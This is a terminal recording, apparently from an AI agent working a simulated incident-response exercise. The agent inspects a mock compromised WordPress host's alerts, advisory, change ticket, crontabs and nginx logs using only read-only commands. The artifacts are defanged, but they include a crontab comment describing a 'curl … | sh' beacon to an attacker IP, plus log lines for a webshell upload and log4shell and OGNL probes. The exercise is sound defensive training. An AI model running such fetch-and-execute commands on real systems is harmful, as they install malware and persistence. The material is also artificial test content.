@@ -1,0 +1,1308 @@
+[?2004hroot@3d46f201add4:/app# asciinema rec --stdin /logs/agent/recording.cast
+[?2004l[0;32masciinema: recording asciicast to /logs/agent/recording.cast[0m
+[0;32masciinema: press <ctrl-d> or type "exit" when you're done[0m
+[?2004hroot@3d46f201add4:/app# clear
+[?2004l[H[J[3J[?2004hroot@3d46f201add4:/app# ls -la /app /sas /sas/handoff /sas/cti /disk
+[?2004l/app:
+total 8
+drwxr-xr-x 2 root root 4096 Aug 16 17:53 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 17:53 [01;34m..[0m
+
+/disk:
+total 24
+dr-xr-xr-x 6 root root  4096 Aug 16 17:53 [01;34m.[0m
+drwxr-xr-x 1 root root  4096 Aug 16 17:53 [01;34m..[0m
+dr-xr-xr-x 2  502 staff 4096 Aug 16 14:29 [01;34metc[0m
+dr-xr-xr-x 3  502 staff 4096 Aug 16 14:29 [01;34mhome[0m
+dr-xr-xr-x 2  502 staff 4096 Aug 16 14:29 [01;34mroot[0m
+dr-xr-xr-x 6  502 staff 4096 Aug 16 14:29 [01;34mvar[0m
+
+/sas:
+total 28
+dr-xr-xr-x 1 root root 4096 Aug 16 17:53 [01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 17:53 [01;34m..[0m
+-r--r--r-- 1 root root  715 Aug 16 14:03 alerts.json
+-r--r--r-- 1 root root  138 Aug 16 14:03 baseline.json
+dr-xr-xr-x 1 root root 4096 Aug 16 17:53 [01;34mcti[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 17:53 [01;34mhandoff[0m
+-r--r--r-- 1 root root  124 Aug 16 14:03 vulns.json
+
+/sas/cti:
+total 32
+dr-xr-xr-x 1 root root 4096 Aug 16 17:53 [01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 17:53 [01;34m..[0m
+-r--r--r-- 1 root root  166 Aug 16 14:29 SOURCES.txt
+-r--r--r-- 1 root root 5590 Aug 16 14:29 [01;35madvisory-page-01.png[0m
+-r--r--r-- 1 root root 2812 Aug 16 14:29 advisory.pdf
+-r--r--r-- 1 root root 1924 Aug 16 14:29 advisory.txt
+-r--r--r-- 1 root root 2069 Aug 16 14:29 [01;35mcampaign-timeline.png[0m
+
+/sas/handoff:
+total 24
+dr-xr-xr-x 1 root root 4096 Aug 16 17:53 [01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 17:53 [01;34m..[0m
+-r--r--r-- 1 root root 1214 Aug 16 14:29 change-ticket.md
+-r--r--r-- 1 root root  380 Aug 16 14:29 findings.partial.json
+-r--r--r-- 1 root root  592 Aug 16 14:29 findings.schema.json
+-r--r--r-- 1 root root 1024 Aug 16 14:29 intake.pdf
+[?2004hroot@3d46f201add4:/app# cat /sas/alerts.json; echo "==="; cat /sas/baseline.json; echo "==="; cat /sas/vulns.json
+[?2004l[
+  {
+    "id": "ALERT-01",
+    "chk": "CHK-01",
+    "kind": "php-webshell",
+    "path": "/var/www/html/wp-content/plugins/contact/inc.php",
+    "capability": "VUL-01",
+    "summary": "php-webshell observed at /var/www/html/wp-content/plugins/contact/inc.php"
+  },
+  {
+    "id": "ALERT-02",
+    "chk": "CHK-02",
+    "kind": "defaced-page",
+    "path": "/var/www/html/index.html",
+    "capability": "ENT-F01",
+    "summary": "defaced-page observed at /var/www/html/index.html"
+  },
+  {
+    "id": "ALERT-03",
+    "chk": "CHK-05",
+    "kind": "wordpress-baseline",
+    "path": "/var/www/html/wp-config.php",
+    "capability": "BAS-01",
+    "summary": "wordpress-baseline observed at /var/www/html/wp-config.php"
+  }
+]
+===
+[
+  {
+    "chk": "CHK-05",
+    "path": "/var/www/html/wp-config.php",
+    "check": "wordpress-baseline",
+    "capability": "BAS-01"
+  }
+]
+===
+[
+  {
+    "chk": "CHK-01",
+    "cve": "CVE-2022-1609",
+    "path": "/var/www/html/wp-content/plugins/contact/inc.php"
+  }
+]
+[?2004hroot@3d46f201add4:/app# cat /sas/cti/advisory.txt; echo "==="; cat /sas/handoff/change-ticket.md; echo "==="; cat /sas/handoff/findings.schema.json
+[?2004lTHREAT INTELLIGENCE ADVISORY — Wordpress Defacement campaign
+============================================================
+
+Distribution: TLP:AMBER   Analyst handoff   Confidence: HIGH   (IOCs are defanged)
+Affected host: wordpress-prod-01   Suspected origin IP: 198.51.100.40
+
+1. EXECUTIVE SUMMARY
+An external actor executed a multi-stage post-compromise sequence. Endpoint alerting covered only part of it; several persistence and anti-forensic actions were silent. Map every on-disk finding to the ATT&CK techniques below and flag which are NOT in the SAS alert feed.
+
+2. ATT&CK TECHNIQUE MAPPING (MITRE ATT&CK Enterprise)
+   T1190      Exploit Public-Facing Application          [initial-access]  step 1: WordPress plugin RCE (CVE-2022-1609)
+   T1505.003  Web Shell                                  [persistence]  step 2: PHP webshell planted
+   T1491.001  Internal Defacement                        [impact]  step 3: site defacement
+   T1053.003  Cron                                       [execution]  step 4: cron persistence
+   T1505.003  Web Shell                                  [persistence]  step 5: .htaccess redirect
+
+3. RELEVANT VULNERABILITIES (source: NVD, US-Gov public domain)
+   CVE-2022-1609  CVSS 9.8 (CRITICAL) v3.1  CWE=CWE-94
+      The School Management WordPress plugin before 9.9.7 contains an obfuscated backdoor injected in it's license checking code that registers a REST API handler, allowing an unauthenticated attacker to execute arbitrary PHP code on the site.
+      ref: https://wpscan.com/vulnerability/e2d546c9-85b6-47a4-b951-781b9ae5d0f2/
+
+4. INDICATORS OF COMPROMISE (defanged)
+   ip     198.51.100.40
+   c2     update-wordpress[.]example[.]cn
+   pool   stratum+tcp[:]//xmr[.]wordpress[.]evil[:]3333
+   wallet 4A0000000000000000001b88b8daaa21
+
+Attribution: MITRE ATT&CK(R) (C) The MITRE Corporation, CC BY 4.0. CVE/CVSS from the U.S. National Vulnerability Database (public domain).
+===
+# CHANGE TICKET  CHG-1481  (DRAFT — reconcile against your findings)
+
+> A previous shift pre-filled this remediation ticket from the SAS alerts ALONE. It is known
+> to be incomplete and contains stale/incorrect lines. Correct it IN PLACE against your own
+> investigation of /disk; cite evidence for every change. Do not author from scratch.
+
+| # | Action | Target | Status | Note |
+|---|--------|--------|--------|------|
+| 1 | Block source IP inbound | 203.0.113.9 | proposed | STALE: prior shift used the wrong IP; confirm the real origin from /disk |
+| 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | proposed | WRONG: not the entry vector for this host — verify against /sas/cti |
+| 3 | Remove cron miner | /var/spool/cron/root | DONE | UNVERIFIED: marked done with no evidence — re-check |
+| 4 | (add) silent persistence you discover | /var/spool/cron/crontabs/www-data | TODO | ticket omits everything not alerted — add the rest |
+
+## Reviewer checklist
+- [ ] Every action maps to a cited artifact under /disk or /sas
+- [ ] Fix the wrong IP (row 1) and wrong CVE (row 2)
+- [ ] Downgrade row 3 from DONE to VERIFIED-or-OPEN with evidence
+- [ ] Add the silent (non-alerted) artifacts the prior shift missed
+===
+{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "title": "finding",
+  "type": "object",
+  "required": [
+    "chk",
+    "path",
+    "attck",
+    "confidence",
+    "evidence"
+  ],
+  "properties": {
+    "chk": {
+      "type": "string"
+    },
+    "path": {
+      "type": "string"
+    },
+    "attck": {
+      "type": "string",
+      "pattern": "^T\\d{4}(\\.\\d{3})?$"
+    },
+    "confidence": {
+      "enum": [
+        "low",
+        "medium",
+        "high"
+      ]
+    },
+    "evidence": {
+      "type": "string",
+      "description": "backtick-cited /disk or /sas path"
+    }
+  }
+}
+[?2004hroot@3d46f201add4:/app# ls -la /disk/var/log /disk/var/www/html /disk/var/spool/cron /disk/etc/cron*
+[?2004l-r--r--r-- 1 502 staff   99 Aug 16 14:29 /disk/etc/crontab
+
+/disk/var/log:
+total 128
+dr-xr-xr-x 3 502 staff  4096 Aug 16 14:29 [0m[01;34m.[0m
+dr-xr-xr-x 6 502 staff  4096 Aug 16 14:29 [01;34m..[0m
+-r--r--r-- 1 502 staff 56980 Aug 16 14:29 auth.log
+-r--r--r-- 1 502 staff  2633 Aug 16 14:29 [01;31mauth.log.1.gz[0m
+-r--r--r-- 1 502 staff 18209 Aug 16 14:29 kern.log
+dr-xr-xr-x 2 502 staff  4096 Aug 16 14:29 [01;34mnginx[0m
+-r--r--r-- 1 502 staff 31282 Aug 16 14:29 syslog
+-r--r--r-- 1 502 staff  1845 Aug 16 14:29 wtmp.csv
+
+/disk/var/spool/cron:
+total 12
+dr-xr-xr-x 3 502 staff 4096 Aug 16 14:29 [01;34m.[0m
+dr-xr-xr-x 3 502 staff 4096 Aug 16 14:29 [01;34m..[0m
+dr-xr-xr-x 2 502 staff 4096 Aug 16 14:29 [01;34mcrontabs[0m
+
+/disk/var/www/html:
+total 24
+dr-xr-xr-x 3 502 staff 4096 Aug 16 14:29 [01;34m.[0m
+dr-xr-xr-x 3 502 staff 4096 Aug 16 14:29 [01;34m..[0m
+-r--r--r-- 1 502 staff   97 Aug 16 14:29 .htaccess
+-r--r--r-- 1 502 staff  132 Aug 16 14:29 index.html
+-r--r--r-- 1 502 staff   99 Aug 16 14:29 wp-config.php
+dr-xr-xr-x 3 502 staff 4096 Aug 16 14:29 [01;34mwp-content[0m
+[?2004hroot@3d46f201add4:/app# ls -la /disk/var/log/nginx /disk/var/spool/cron/crontabs
+[?2004l/disk/var/log/nginx:
+total 100
+dr-xr-xr-x 2 502 staff  4096 Aug 16 14:29 [0m[01;34m.[0m
+dr-xr-xr-x 3 502 staff  4096 Aug 16 14:29 [01;34m..[0m
+-r--r--r-- 1 502 staff 82269 Aug 16 14:29 access.log
+-r--r--r-- 1 502 staff  5716 Aug 16 14:29 error.log
+
+/disk/var/spool/cron/crontabs:
+total 12
+dr-xr-xr-x 2 502 staff 4096 Aug 16 14:29 [01;34m.[0m
+dr-xr-xr-x 3 502 staff 4096 Aug 16 14:29 [01;34m..[0m
+-r--r--r-- 1 502 staff  317 Aug 16 14:29 www-data
+[?2004hroot@3d46f201add4:/app# find /disk/var/www/html -type f
+[?2004l/disk/var/www/html/.htaccess
+/disk/var/www/html/index.html
+/disk/var/www/html/wp-content/plugins/contact/inc.php
+/disk/var/www/html/wp-config.php
+[?2004hroot@3d46f201add4:/app# cat -n /disk/var/spool/cron/crontabs/* /disk/etc/crontab 2>/dev/null; echo "==="; cat -n /disk/var/www/html/.htaccess; echo "==="; cat -n /disk/var/www/html/index.html; echo "==="; cat -n /disk/var/www/html/wp-config.php
+[?2004l     1	# m h dom mon dow user command
+     2	0 3 * * * root /usr/local/bin/backup.sh
+     3	30 4 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf
+     4	*/15 * * * * nobody /usr/bin/check-health.sh
+     5	# * * * * * root <defanged beacon: curl hxxp://198.51.100.40/x | sh> — cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload
+     6	SHELL=/bin/bash
+     7	0 3 * * * root /usr/local/bin/backup.sh
+     8	17 * * * * root run-parts /etc/cron.hourly
+===
+     1	# .htaccess
+     2	.htaccess RewriteRule redirect of all traffic to 198.51.100.40 (pharma) — defanged
+===
+     1	<!doctype html><html><body>
+     2	suspicious defaced-page artifact observed (defanged)
+     3	indicator hacked=CHK-02 (T1491.001)
+     4	</body></html>
+===
+     1	<?php
+     2	// wp-config.php
+     3	require 'config.php';
+     4	wp-config.php DB_PASSWORD is weak; XML-RPC enabled
+     5	?>
+[?2004hroot@3d46f201add4:/app# cat /sas/alerts.json; echo "==="; cat /sas/baseline.json; echo "==="; cat /sas/vulns.json
+[?2004l[
+  {
+    "id": "ALERT-01",
+    "chk": "CHK-01",
+    "kind": "php-webshell",
+    "path": "/var/www/html/wp-content/plugins/contact/inc.php",
+    "capability": "VUL-01",
+    "summary": "php-webshell observed at /var/www/html/wp-content/plugins/contact/inc.php"
+  },
+  {
+    "id": "ALERT-02",
+    "chk": "CHK-02",
+    "kind": "defaced-page",
+    "path": "/var/www/html/index.html",
+    "capability": "ENT-F01",
+    "summary": "defaced-page observed at /var/www/html/index.html"
+  },
+  {
+    "id": "ALERT-03",
+    "chk": "CHK-05",
+    "kind": "wordpress-baseline",
+    "path": "/var/www/html/wp-config.php",
+    "capability": "BAS-01",
+    "summary": "wordpress-baseline observed at /var/www/html/wp-config.php"
+  }
+]
+===
+[
+  {
+    "chk": "CHK-05",
+    "path": "/var/www/html/wp-config.php",
+    "check": "wordpress-baseline",
+    "capability": "BAS-01"
+  }
+]
+===
+[
+  {
+    "chk": "CHK-01",
+    "cve": "CVE-2022-1609",
+    "path": "/var/www/html/wp-content/plugins/contact/inc.php"
+  }
+]
+[?2004hroot@3d46f201add4:/app# cat /sas/cti/advisory.txt; echo "==="; cat /sas/handoff/change-ticket.md; echo "==="; cat /sas/handoff/findings.schema.json
+[?2004lTHREAT INTELLIGENCE ADVISORY — Wordpress Defacement campaign
+============================================================
+
+Distribution: TLP:AMBER   Analyst handoff   Confidence: HIGH   (IOCs are defanged)
+Affected host: wordpress-prod-01   Suspected origin IP: 198.51.100.40
+
+1. EXECUTIVE SUMMARY
+An external actor executed a multi-stage post-compromise sequence. Endpoint alerting covered only part of it; several persistence and anti-forensic actions were silent. Map every on-disk finding to the ATT&CK techniques below and flag which are NOT in the SAS alert feed.
+
+2. ATT&CK TECHNIQUE MAPPING (MITRE ATT&CK Enterprise)
+   T1190      Exploit Public-Facing Application          [initial-access]  step 1: WordPress plugin RCE (CVE-2022-1609)
+   T1505.003  Web Shell                                  [persistence]  step 2: PHP webshell planted
+   T1491.001  Internal Defacement                        [impact]  step 3: site defacement
+   T1053.003  Cron                                       [execution]  step 4: cron persistence
+   T1505.003  Web Shell                                  [persistence]  step 5: .htaccess redirect
+
+3. RELEVANT VULNERABILITIES (source: NVD, US-Gov public domain)
+   CVE-2022-1609  CVSS 9.8 (CRITICAL) v3.1  CWE=CWE-94
+      The School Management WordPress plugin before 9.9.7 contains an obfuscated backdoor injected in it's license checking code that registers a REST API handler, allowing an unauthenticated attacker to execute arbitrary PHP code on the site.
+      ref: https://wpscan.com/vulnerability/e2d546c9-85b6-47a4-b951-781b9ae5d0f2/
+
+4. INDICATORS OF COMPROMISE (defanged)
+   ip     198.51.100.40
+   c2     update-wordpress[.]example[.]cn
+   pool   stratum+tcp[:]//xmr[.]wordpress[.]evil[:]3333
+   wallet 4A0000000000000000001b88b8daaa21
+
+Attribution: MITRE ATT&CK(R) (C) The MITRE Corporation, CC BY 4.0. CVE/CVSS from the U.S. National Vulnerability Database (public domain).
+===
+# CHANGE TICKET  CHG-1481  (DRAFT — reconcile against your findings)
+
+> A previous shift pre-filled this remediation ticket from the SAS alerts ALONE. It is known
+> to be incomplete and contains stale/incorrect lines. Correct it IN PLACE against your own
+> investigation of /disk; cite evidence for every change. Do not author from scratch.
+
+| # | Action | Target | Status | Note |
+|---|--------|--------|--------|------|
+| 1 | Block source IP inbound | 203.0.113.9 | proposed | STALE: prior shift used the wrong IP; confirm the real origin from /disk |
+| 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | proposed | WRONG: not the entry vector for this host — verify against /sas/cti |
+| 3 | Remove cron miner | /var/spool/cron/root | DONE | UNVERIFIED: marked done with no evidence — re-check |
+| 4 | (add) silent persistence you discover | /var/spool/cron/crontabs/www-data | TODO | ticket omits everything not alerted — add the rest |
+
+## Reviewer checklist
+- [ ] Every action maps to a cited artifact under /disk or /sas
+- [ ] Fix the wrong IP (row 1) and wrong CVE (row 2)
+- [ ] Downgrade row 3 from DONE to VERIFIED-or-OPEN with evidence
+- [ ] Add the silent (non-alerted) artifacts the prior shift missed
+===
+{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "title": "finding",
+  "type": "object",
+  "required": [
+    "chk",
+    "path",
+    "attck",
+    "confidence",
+    "evidence"
+  ],
+  "properties": {
+    "chk": {
+      "type": "string"
+    },
+    "path": {
+      "type": "string"
+    },
+    "attck": {
+      "type": "string",
+      "pattern": "^T\\d{4}(\\.\\d{3})?$"
+    },
+    "confidence": {
+      "enum": [
+        "low",
+        "medium",
+        "high"
+      ]
+    },
+    "evidence": {
+      "type": "string",
+      "description": "backtick-cited /disk or /sas path"
+    }
+  }
+}
+[?2004hroot@3d46f201add4:/app# cat -n /disk/var/spool/cron/crontabs/www-data; echo "==="; cat -n /disk/var/www/html/wp-content/plugins/contact/inc.php
+[?2004l     1	# m h dom mon dow user command
+     2	0 3 * * * root /usr/local/bin/backup.sh
+     3	30 4 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf
+     4	*/15 * * * * nobody /usr/bin/check-health.sh
+     5	# * * * * * root <defanged beacon: curl hxxp://198.51.100.40/x | sh> — cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload
+===
+     1	<?php
+     2	// inc.php
+     3	require 'config.php';
+     4	PHP webshell: calls eval() on base64_decode() of the request body — defanged, non-runnable
+     5	?>
+[?2004hroot@3d46f201add4:/app# head -n 20 /disk/var/log/nginx/access.log; echo "==="; head -n 20 /disk/var/log/nginx/error.log
+[?2004l10.10.169.214 - - [09/Aug/2026:12:42:09 +0000] "GET /robots.txt HTTP/1.1" 200 7803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.18 - - [09/Aug/2026:05:55:58 +0000] "GET /static/app.js HTTP/1.1" 200 2282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.164 - - [09/Aug/2026:02:58:00 +0000] "GET /static/app.js HTTP/1.1" 200 7411 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.22 - - [09/Aug/2026:13:29:23 +0000] "GET /index.html HTTP/1.1" 200 4688 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.3 - - [09/Aug/2026:20:05:15 +0000] "GET /favicon.ico HTTP/1.1" 200 2686 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.74 - - [09/Aug/2026:07:07:18 +0000] "GET /favicon.ico HTTP/1.1" 304 6146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.25 - - [09/Aug/2026:18:21:24 +0000] "GET /login HTTP/1.1" 404 2625 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.39 - - [09/Aug/2026:06:58:20 +0000] "GET /favicon.ico HTTP/1.1" 200 1787 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.14 - - [09/Aug/2026:04:27:05 +0000] "GET /static/app.js HTTP/1.1" 404 4413 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.220 - - [09/Aug/2026:09:54:53 +0000] "GET / HTTP/1.1" 200 4232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.150 - - [09/Aug/2026:12:43:28 +0000] "GET / HTTP/1.1" 200 6340 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.228 - - [09/Aug/2026:22:18:27 +0000] "GET /favicon.ico HTTP/1.1" 404 3354 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.94 - - [09/Aug/2026:16:55:45 +0000] "GET /static/app.js HTTP/1.1" 200 4984 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.196 - - [09/Aug/2026:07:34:40 +0000] "GET /index.html HTTP/1.1" 404 8721 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.120 - - [09/Aug/2026:17:54:43 +0000] "GET /index.html HTTP/1.1" 200 4675 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.129 - - [09/Aug/2026:13:06:02 +0000] "GET /robots.txt HTTP/1.1" 200 3713 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.184 - - [09/Aug/2026:12:18:51 +0000] "GET /static/app.js HTTP/1.1" 404 2890 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.152 - - [09/Aug/2026:10:40:45 +0000] "GET /login HTTP/1.1" 200 1984 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.11 - - [09/Aug/2026:11:16:17 +0000] "GET / HTTP/1.1" 200 1462 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.169.161 - - [09/Aug/2026:02:38:14 +0000] "GET /static/app.js HTTP/1.1" 304 3846 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+===
+Aug  9 01:06:51 wordpress-prod-01 kernel[7307]: Received disconnect from 10.10.169.77 port 56250:11: disconnected by user
+Aug  9 01:07:38 wordpress-prod-01 dbus-daemon[711]: CPU0: Package temperature normal
+Aug  9 01:07:58 wordpress-prod-01 kernel[16467]: Time synchronised to time server
+Aug  9 01:08:28 wordpress-prod-01 sudo[20932]: pam_unix(cron:session): session opened for user root
+Aug  9 01:08:49 wordpress-prod-01 sudo[20270]: Started Session 953 of user root.
+Aug  9 01:09:21 wordpress-prod-01 systemd-logind[16153]: Started Session 425 of user jenkins.
+Aug  9 01:09:54 wordpress-prod-01 sshd[435]: Received disconnect from 10.10.169.66 port 53501:11: disconnected by user
+Aug  9 01:09:58 wordpress-prod-01 sshd[17982]: Time synchronised to time server
+Aug  9 01:10:19 wordpress-prod-01 chronyd[12639]: Started Session 817 of user root.
+Aug  9 01:11:04 wordpress-prod-01 sshd[11340]: Time synchronised to time server
+Aug  9 01:11:39 wordpress-prod-01 sshd[3276]: Received disconnect from 10.10.169.234 port 55722:11: disconnected by user
+Aug  9 01:11:42 wordpress-prod-01 kernel[27808]: Started Session 324 of user devops.
+Aug  9 01:11:48 wordpress-prod-01 systemd[15185]: pam_unix(cron:session): session opened for user root
+Aug  9 01:11:49 wordpress-prod-01 kernel[5245]: Received disconnect from 10.10.169.109 port 60717:11: disconnected by user
+Aug  9 01:12:26 wordpress-prod-01 kernel[27444]: Received disconnect from 10.10.169.193 port 44704:11: disconnected by user
+Aug  9 01:12:47 wordpress-prod-01 sshd[23338]: Started Session 160 of user jenkins.
+Aug  9 01:12:58 wordpress-prod-01 systemd-logind[28590]: Started Session 871 of user devops.
+Aug  9 01:12:59 wordpress-prod-01 CRON[17247]: Started Session 913 of user jenkins.
+Aug  9 01:13:39 wordpress-prod-01 systemd[21869]: Time synchronised to time server
+Aug  9 01:14:29 wordpress-prod-01 chronyd[11713]: CPU0: Package temperature normal
+[?2004hroot@3d46f201add4:/app# cat -n /disk/var/www/html/wp-content/plugins/contact/inc.php; echo "==="; grep -n -E "inc.php|198.51.100.40|contact|POST" /disk/var/log/nginx/access.log
+[?2004l     1	<?php
+     2	// inc.php
+     3	require 'config.php';
+     4	PHP webshell: calls eval() on base64_decode() of the request body — defanged, non-runnable
+     5	?>
+===
+[32m[K297[m[K[36m[K:[m[K[01;31m[K198.51.100.40[m[K - - [09/Aug/2026:03:11:17 +0000] "[01;31m[KPOST[m[K /uploads/shell.php HTTP/1.1" 200 743 "-" "curl/7.88 (defanged webshell upload)"
+[32m[K298[m[K[36m[K:[m[K[01;31m[K198.51.100.40[m[K - - [09/Aug/2026:03:12:49 +0000] "GET /?x=jndi-ldap-lookup-defanged-to-[01;31m[K198.51.100.40[m[K-1389 HTTP/1.1" 500 0 "-" "Java (log4shell attempt, defanged)"
+[32m[K299[m[K[36m[K:[m[K[01;31m[K198.51.100.40[m[K - - [09/Aug/2026:03:13:22 +0000] "GET /struts2-showcase/ HTTP/1.1" 200 635 "-" "OGNL-probe (defanged)"
+[?2004hroot@3d46f201add4:/app# cat /sas/alerts.json; echo "==="; cat /sas/baseline.json; echo "==="; cat /sas/vulns.json
+[?2004l[
+  {
+    "id": "ALERT-01",
+    "chk": "CHK-01",
+    "kind": "php-webshell",
+    "path": "/var/www/html/wp-content/plugins/contact/inc.php",
+    "capability": "VUL-01",
+    "summary": "php-webshell observed at /var/www/html/wp-content/plugins/contact/inc.php"
+  },
+  {
+    "id": "ALERT-02",
+    "chk": "CHK-02",
+    "kind": "defaced-page",
+    "path": "/var/www/html/index.html",
+    "capability": "ENT-F01",
+    "summary": "defaced-page observed at /var/www/html/index.html"
+  },
+  {
+    "id": "ALERT-03",
+    "chk": "CHK-05",
+    "kind": "wordpress-baseline",
+    "path": "/var/www/html/wp-config.php",
+    "capability": "BAS-01",
+    "summary": "wordpress-baseline observed at /var/www/html/wp-config.php"
+  }
+]
+===
+[
+  {
+    "chk": "CHK-05",
+    "path": "/var/www/html/wp-config.php",
+    "check": "wordpress-baseline",
+    "capability": "BAS-01"
+  }
+]
+===
+[
+  {
+    "chk": "CHK-01",
+    "cve": "CVE-2022-1609",
+    "path": "/var/www/html/wp-content/plugins/contact/inc.php"
+  }
+]
+[?2004hroot@3d46f201add4:/app# cat /sas/cti/advisory.txt; echo "==="; cat /sas/handoff/change-ticket.md
+[?2004lTHREAT INTELLIGENCE ADVISORY — Wordpress Defacement campaign
+============================================================
+
+Distribution: TLP:AMBER   Analyst handoff   Confidence: HIGH   (IOCs are defanged)
+Affected host: wordpress-prod-01   Suspected origin IP: 198.51.100.40
+
+1. EXECUTIVE SUMMARY
+An external actor executed a multi-stage post-compromise sequence. Endpoint alerting covered only part of it; several persistence and anti-forensic actions were silent. Map every on-disk finding to the ATT&CK techniques below and flag which are NOT in the SAS alert feed.
+
+2. ATT&CK TECHNIQUE MAPPING (MITRE ATT&CK Enterprise)
+   T1190      Exploit Public-Facing Application          [initial-access]  step 1: WordPress plugin RCE (CVE-2022-1609)
+   T1505.003  Web Shell                                  [persistence]  step 2: PHP webshell planted
+   T1491.001  Internal Defacement                        [impact]  step 3: site defacement
+   T1053.003  Cron                                       [execution]  step 4: cron persistence
+   T1505.003  Web Shell                                  [persistence]  step 5: .htaccess redirect
+
+3. RELEVANT VULNERABILITIES (source: NVD, US-Gov public domain)
+   CVE-2022-1609  CVSS 9.8 (CRITICAL) v3.1  CWE=CWE-94
+      The School Management WordPress plugin before 9.9.7 contains an obfuscated backdoor injected in it's license checking code that registers a REST API handler, allowing an unauthenticated attacker to execute arbitrary PHP code on the site.
+      ref: https://wpscan.com/vulnerability/e2d546c9-85b6-47a4-b951-781b9ae5d0f2/
+
+4. INDICATORS OF COMPROMISE (defanged)
+   ip     198.51.100.40
+   c2     update-wordpress[.]example[.]cn
+   pool   stratum+tcp[:]//xmr[.]wordpress[.]evil[:]3333
+   wallet 4A0000000000000000001b88b8daaa21
+
+Attribution: MITRE ATT&CK(R) (C) The MITRE Corporation, CC BY 4.0. CVE/CVSS from the U.S. National Vulnerability Database (public domain).
+===
+# CHANGE TICKET  CHG-1481  (DRAFT — reconcile against your findings)
+
+> A previous shift pre-filled this remediation ticket from the SAS alerts ALONE. It is known
+> to be incomplete and contains stale/incorrect lines. Correct it IN PLACE against your own
+> investigation of /disk; cite evidence for every change. Do not author from scratch.
+
+| # | Action | Target | Status | Note |
+|---|--------|--------|--------|------|
+| 1 | Block source IP inbound | 203.0.113.9 | proposed | STALE: prior shift used the wrong IP; confirm the real origin from /disk |
+| 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | proposed | WRONG: not the entry vector for this host — verify against /sas/cti |
+| 3 | Remove cron miner | /var/spool/cron/root | DONE | UNVERIFIED: marked done with no evidence — re-check |
+| 4 | (add) silent persistence you discover | /var/spool/cron/crontabs/www-data | TODO | ticket omits everything not alerted — add the rest |
+
+## Reviewer checklist
+- [ ] Every action maps to a cited artifact under /disk or /sas
+- [ ] Fix the wrong IP (row 1) and wrong CVE (row 2)
+- [ ] Downgrade row 3 from DONE to VERIFIED-or-OPEN with evidence
+- [ ] Add the silent (non-alerted) artifacts the prior shift missed
+[?2004hroot@3d46f201add4:/app# sed -n '290,305p' /disk/var/log/nginx/access.log | cat -n
+[?2004l     1	10.10.169.185 - - [09/Aug/2026:06:51:18 +0000] "GET /favicon.ico HTTP/1.1" 200 8167 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+     2	10.10.169.77 - - [09/Aug/2026:22:32:43 +0000] "GET /index.html HTTP/1.1" 200 5440 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+     3	10.10.169.180 - - [09/Aug/2026:04:46:21 +0000] "GET /static/app.js HTTP/1.1" 304 3432 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+     4	10.10.169.208 - - [09/Aug/2026:16:21:13 +0000] "GET /api/health HTTP/1.1" 200 1999 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+     5	10.10.169.225 - - [09/Aug/2026:14:28:18 +0000] "GET /login HTTP/1.1" 404 2253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+     6	10.10.169.95 - - [09/Aug/2026:10:28:17 +0000] "GET /login HTTP/1.1" 200 5399 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+     7	10.10.169.232 - - [09/Aug/2026:00:39:49 +0000] "GET /static/app.js HTTP/1.1" 304 8953 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+     8	198.51.100.40 - - [09/Aug/2026:03:11:17 +0000] "POST /uploads/shell.php HTTP/1.1" 200 743 "-" "curl/7.88 (defanged webshell upload)"
+     9	198.51.100.40 - - [09/Aug/2026:03:12:49 +0000] "GET /?x=jndi-ldap-lookup-defanged-to-198.51.100.40-1389 HTTP/1.1" 500 0 "-" "Java (log4shell attempt, defanged)"
